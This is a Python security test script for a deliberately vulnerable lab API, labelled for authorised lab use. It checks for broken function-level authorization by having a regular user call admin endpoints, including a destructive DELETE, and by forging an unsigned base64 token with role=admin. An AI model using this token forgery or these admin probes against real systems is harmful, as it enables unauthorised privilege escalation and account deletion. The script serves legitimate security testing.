"""
Broken Function Level Authorization tester  (BFLA, OWASP API5:2019)
===================================================================
Logs in as a regular user and attempts privileged, admin-only functions:

    GET    /api/admin/users          (list every account)
    DELETE /api/admin/users/<id>     (destructive)

Also demonstrates TOKEN FORGERY against the vulnerable build, whose
"token" is a reversible base64(user_id:role) string: we forge role=admin
and replay it. A hardened build signs its tokens, so the forgery fails.

Usage:
    python test_bfla.py
Authorised lab use only.
"""
import base64
import requests
from common import BASE_URL, TIMEOUT, banner, vuln, safe, info, login, auth_headers

findings = []


def forge_admin_token(user_id=2):
    """Craft the vulnerable build's unsigned token with role=admin."""
    raw = f"{user_id}:admin".encode()
    return base64.b64encode(raw).decode()


def run():
    banner("API5 - Broken Function Level Authorization (BFLA)")

    token, role, status = login("bob", "password")
    if not token:
        token, role, status = login("bob", "Str0ng-Passphrase-99")
    if not token:
        info(f"Could not log in as bob (HTTP {status}); aborting BFLA test")
        return
    info(f"Authenticated as regular user bob (role={role})")

    # 1) Straight attempt to hit the admin listing with the normal user token.
    r = requests.get(f"{BASE_URL}/api/admin/users",
                     headers=auth_headers(token), timeout=TIMEOUT)
    if r.status_code == 200:
        vuln(f"Regular user listed ALL accounts via /api/admin/users "
             f"({len(r.json().get('users', []))} users exposed)")
        findings.append("Regular user can reach admin user-listing endpoint")
    elif r.status_code == 403:
        safe("Admin listing denied for regular user (HTTP 403) -> function-level auth enforced")
    else:
        info(f"Unexpected HTTP {r.status_code} on admin listing")

    # 2) Token forgery: forge role=admin and replay (works only on vuln build).
    forged = forge_admin_token(user_id=2)
    r = requests.get(f"{BASE_URL}/api/admin/users",
                     headers=auth_headers(forged), timeout=TIMEOUT)
    if r.status_code == 200:
        vuln("Forged base64 'role=admin' token accepted -> unsigned-token escalation")
        findings.append("Privilege escalation via forged unsigned token")
    else:
        safe(f"Forged token rejected (HTTP {r.status_code}) -> tokens are signed/verified")

    # 3) Probe the destructive admin action with the regular token (non-existent id,
    #    so nothing real is harmed even on the vulnerable build).
    probe_id = 9999
    r = requests.delete(f"{BASE_URL}/api/admin/users/{probe_id}",
                        headers=auth_headers(token), timeout=TIMEOUT)
    if r.status_code == 200:
        vuln(f"Regular user reached destructive DELETE /api/admin/users/{probe_id} (HTTP 200)")
        findings.append("Regular user can invoke destructive admin DELETE")
    elif r.status_code == 403:
        safe("Destructive admin DELETE denied for regular user (HTTP 403)")
    else:
        info(f"Unexpected HTTP {r.status_code} on admin DELETE probe")

    print(f"\n  Summary: {len(findings)} BFLA finding(s).")
    for f in findings:
        print(f"    - {f}")


if __name__ == "__main__":
    run()
